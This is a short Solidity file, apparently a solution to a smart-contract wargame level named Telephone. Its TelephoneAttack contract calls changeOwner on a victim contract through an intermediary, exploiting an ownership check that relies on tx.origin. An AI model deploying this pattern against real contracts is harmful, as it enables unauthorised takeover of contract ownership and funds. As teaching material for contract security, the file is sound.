pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) public {}
}

contract TelephoneAttack {
  function attack(address _victim, address _owner) public {
    Telephone telephone = Telephone(_victim);
    telephone.changeOwner(_owner);
  }
}
